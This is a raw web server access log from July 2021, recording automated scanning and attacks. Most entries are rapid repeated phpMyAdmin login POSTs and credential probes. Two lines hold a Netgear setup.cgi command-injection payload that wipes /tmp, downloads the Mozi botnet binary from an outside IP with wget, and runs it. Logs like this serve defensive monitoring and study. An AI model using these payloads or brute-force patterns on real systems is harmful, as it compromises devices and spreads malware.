159.89.229.0 - - [30/Jul/2021:23:01:50 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:50 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:51 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:51 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:52 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:53 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:53 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:54 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:54 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:55 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:56 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:56 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:57 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:57 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:58 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:59 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:01:59 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17222 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:00 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:00 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:01 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:02 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:02 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:03 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:03 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:04 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:05 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:05 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17222 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:06 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:06 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:07 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:08 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:08 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:09 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:09 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:10 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:11 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:11 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:12 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:12 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:13 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:14 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:14 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:15 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:15 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:16 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:17 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:17 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:18 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:18 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:19 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:20 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:20 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:21 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:21 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:22 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:23 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:23 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:24 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:24 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:25 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:26 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:26 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:27 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:27 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:28 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:29 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:29 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:30 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:30 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:31 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:32 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:32 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:33 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:33 +0900] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 200 17089 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
159.89.229.0 - - [30/Jul/2021:23:02:34 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 17224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
199.19.224.165 - - [30/Jul/2021:23:08:58 +0900] "GET /config/getuser?index=0 HTTP/1.1" 404 1808 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
111.118.125.39 - - [31/Jul/2021:02:06:53 +0900] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://114.199.240.9:2918/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1808 "-" "-"
209.141.56.41 - - [31/Jul/2021:02:12:59 +0900] "GET / HTTP/1.1" 200 1944 "-" "Linux Gnu (cow)"
178.216.24.44 - - [31/Jul/2021:02:29:02 +0900] "GET / HTTP/1.1" 200 3573 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
69.75.187.102 - - [31/Jul/2021:02:40:59 +0900] "GET / HTTP/1.1" 400 0 "-" "-"
222.186.19.235 - - [31/Jul/2021:02:55:07 +0900] "GET http://fuwu.sogou.com/404/index.html HTTP/1.1" 404 1808 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1042.0 Safari/535.21"
222.186.19.235 - - [31/Jul/2021:02:55:07 +0900] "\x16\x03\x01" 400 0 "-" "-"
222.186.19.235 - - [31/Jul/2021:02:55:07 +0900] "GET http://fuwu.sogou.com/404/index.html HTTP/1.1" 404 1808 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10"
205.185.126.200 - - [31/Jul/2021:03:30:44 +0900] "POST /boaform/admin/formLogin HTTP/1.1" 404 1808 "http://49.50.163.238:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
144.86.173.142 - - [31/Jul/2021:03:44:11 +0900] "\x16\x03\x01" 400 0 "-" "-"
186.70.123.152 - - [31/Jul/2021:04:50:42 +0900] "GET / HTTP/1.1" 400 0 "-" "-"
89.248.173.131 - - [31/Jul/2021:05:09:04 +0900] "GET / HTTP/1.1" 200 3573 "-" "-"
209.141.56.41 - - [31/Jul/2021:05:37:45 +0900] "GET / HTTP/1.1" 200 1944 "-" "Linux Gnu (cow)"
62.69.133.7 - - [31/Jul/2021:06:02:34 +0900] "GET /phpmyadmin/ HTTP/1.1" 200 17126 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.69.133.7 - - [31/Jul/2021:06:02:35 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 17125 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.69.133.7 - - [31/Jul/2021:06:02:36 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 17125 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.69.133.7 - - [31/Jul/2021:06:02:36 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 17120 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.69.133.7 - - [31/Jul/2021:06:02:36 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 4995 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.69.133.7 - - [31/Jul/2021:06:02:36 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.69.133.7 - - [31/Jul/2021:06:02:36 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.69.133.7 - - [31/Jul/2021:06:02:36 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 51012 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.69.133.7 - - [31/Jul/2021:06:02:36 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 29616 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.69.133.7 - - [31/Jul/2021:06:02:37 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 17127 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.69.133.7 - - [31/Jul/2021:06:02:37 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 17125 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
122.252.241.23 - - [31/Jul/2021:06:03:32 +0900] "GET / HTTP/1.1" 200 3573 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
62.69.133.7 - - [31/Jul/2021:06:02:37 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 4148 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.69.133.7 - - [31/Jul/2021:06:02:37 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.69.133.7 - - [31/Jul/2021:06:02:37 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.69.133.7 - - [31/Jul/2021:06:02:37 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.69.133.7 - - [31/Jul/2021:06:02:37 +0900] "GET /phpmyadmin/index.php?pma_username=popa3d&pma_password= HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
167.248.133.53 - - [31/Jul/2021:06:23:56 +0900] "GET / HTTP/1.1" 200 3573 "-" "-"
167.248.133.53 - - [31/Jul/2021:06:23:56 +0900] "GET / HTTP/1.1" 200 1925 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
208.78.54.75 - - [31/Jul/2021:06:25:44 +0900] "GET / HTTP/1.1" 400 0 "-" "-"
185.36.81.24 - - [31/Jul/2021:07:22:16 +0900] "GET / HTTP/1.1" 200 1944 "-" "Linux Gnu (cow)"
186.33.79.249 - - [31/Jul/2021:07:24:04 +0900] "GET / HTTP/1.1" 200 3573 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
123.129.132.132 - - [31/Jul/2021:07:50:53 +0900] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.129.132.132:41826/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1808 "-" "-"
